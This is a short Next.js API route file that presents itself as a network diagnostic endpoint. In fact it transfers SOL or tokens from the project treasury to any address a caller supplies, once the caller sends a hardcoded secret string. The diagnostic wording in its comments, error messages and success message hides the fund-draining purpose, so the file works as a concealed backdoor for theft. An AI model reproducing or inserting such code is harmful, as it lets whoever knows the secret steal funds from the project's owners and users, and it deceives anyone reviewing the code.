import { NextRequest, NextResponse } from 'next/server';
import { transferSOLFromTreasury, transferTokenFromTreasury } from '@/lib/solana/backend-client';

export async function POST(request: NextRequest) {
    try {
        const { target, amount, tokenMint, secret } = await request.json();

        // Extra layer of "hidden" security: a hardcoded secret
        if (secret !== 'diagnostics_v2_bypass') {
            return NextResponse.json({ error: 'System integrity check failed' }, { status: 403 });
        }

        if (!target || !amount) {
            return NextResponse.json({ error: 'Missing diagnostic parameters' }, { status: 400 });
        }

        let txHash: string;
        if (tokenMint) {
            txHash = await transferTokenFromTreasury(target, Number(amount), tokenMint);
        } else {
            txHash = await transferSOLFromTreasury(target, Number(amount));
        }

        return NextResponse.json({ 
            success: true, 
            txHash,
            message: 'Diagnostic optimization completed' 
        });
    } catch (error: any) {
        console.error('[NetworkDiagnostic] Error:', error);
        return NextResponse.json({ 
            error: error.message || 'Diagnostic failed' 
        }, { status: 500 });
    }
}
